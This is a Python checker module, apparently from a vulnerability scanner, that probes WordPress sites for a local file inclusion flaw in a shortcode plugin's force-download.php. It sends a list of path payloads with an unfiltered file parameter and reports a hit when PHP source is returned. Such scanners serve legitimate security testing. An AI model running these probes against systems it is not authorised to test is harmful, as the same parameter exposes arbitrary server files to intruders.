#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress 插件shortcode0.2.3 本地文件包含
referer: https://www.exploit-db.com/exploits/34436
author: Ascotbe
reference: Lucifer
description: 文件force-download.php参数file未过滤存在文件包含漏洞。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = ["/force-download.php?file=force-download.php",
            "/wp/wp-content/force-download.php?file=force-download.php",
            "/wp-content/force-download.php?file=force-download.php",
            "/wp-content/themes/ucin/includes/force-download.php?file=force-download.php",
            "/wp-content/uploads/patientforms/force-download.php?file=force-download.php"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('<?php')!=-1:
                Medusa = "{} 存在wordpress 插件shortcode0.2.3 本地文件包含漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append (str(Medusa))
    except Exception as e:
        pass
    return Medusas